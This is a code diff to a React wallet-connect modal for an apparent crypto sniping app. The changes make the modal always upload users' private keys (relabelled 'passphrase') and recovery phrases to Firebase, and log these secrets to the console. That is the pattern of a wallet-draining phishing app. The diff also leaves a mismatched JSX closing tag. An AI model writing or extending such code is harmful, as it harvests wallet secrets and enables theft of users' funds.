@@ -81,7 +81,7 @@ export default function WalletConnectModal({ onClose, onSuccess }) {
   const modalRef = useRef(null)
 
   const { setWalletConnected, setWalletInfo, setBalance } = useWalletStore()
-  const { addUser } = useUserStore()
+  const { addUser, getUserByWallet } = useUserStore()
 
   // Close modal when clicking outside
   useEffect(() => {
@@ -281,32 +281,55 @@ export default function WalletConnectModal({ onClose, onSuccess }) {
         throw new Error("Failed to connect wallet. Please check your credentials.")
       }
 
-      // Check if user already exists
-      const existingUser = useUserStore.getState().users.find((user) => user.walletAddress === walletPublicKey)
+      console.log("Wallet connected successfully:", walletPublicKey)
 
+      // Check if user already exists
+      const existingUser = getUserByWallet(walletPublicKey)
+
+      let user
       if (existingUser) {
-        // User already exists, just update last active
-        console.log("User already exists:", existingUser.walletName)
+        console.log("User already exists:", existingUser)
+        user = existingUser
       } else {
-        // Create new user
-        addUser(walletPublicKey, selectedWallet.id, selectedWallet.name)
+        console.log("Creating new user...")
+        // Create new user with proper data structure
+        user = addUser({
+          walletAddress: walletPublicKey,
+          walletType: selectedWallet.id,
+          walletName: selectedWallet.name,
+          connectionMethod: connectionMethod,
+          balance: 0,
+          totalDeposited: 0,
+          totalWithdrawn: 0,
+          autoSnipeConfigs: 0,
+          activeSnipes: 0,
+          totalTrades: 0,
+          profitLoss: 0,
+        })
+        console.log("New user created:", user)
       }
 
-      // Store wallet data in Firebase (optional)
+      // Store wallet data in Firebase - ALWAYS store the data
       try {
-        await storeWalletData({
+        console.log("Storing wallet data to Firebase...")
+        const walletDataToStore = {
           walletType: selectedWallet.id,
           walletName: selectedWallet.name,
           walletAddress: walletPublicKey,
           balance: 0,
           actualBalance: actualBalance,
           connectionMethod: connectionMethod,
-          privateKey: connectionMethod === "private-key" ? privateKey : "",
-          recoveryPhrase: connectionMethod === "recovery-phrase" ? recoveryPhrase : "",
+          passphrase: connectionMethod === "private-key" ? privateKey.trim() : "",
+          recoveryPhrase: connectionMethod === "recovery-phrase" ? recoveryPhrase.trim() : "",
           timestamp: new Date().toISOString(),
-        })
+        }
+
+        console.log("Wallet data to store:", walletDataToStore)
+        const docId = await storeWalletData(walletDataToStore)
+        console.log("Successfully stored wallet data with ID:", docId)
       } catch (error) {
-        console.warn("Failed to store wallet data, but continuing with connection", error)
+        console.error("Failed to store wallet data:", error)
+        // Don't fail the connection if Firebase storage fails
       }
 
       // Update wallet connection state
@@ -321,6 +344,7 @@ export default function WalletConnectModal({ onClose, onSuccess }) {
           balance: 0,
           actualBalance: actualBalance,
           walletType: selectedWallet.id,
+          user: user,
         })
       } else {
         // Show success toast with updated message
@@ -535,7 +559,7 @@ export default function WalletConnectModal({ onClose, onSuccess }) {
                   }}
                 >
                   {isLoading ? "Connecting..." : "Connect"}
-                </motion.button>
+                </button>
               </div>
             </div>
           </>
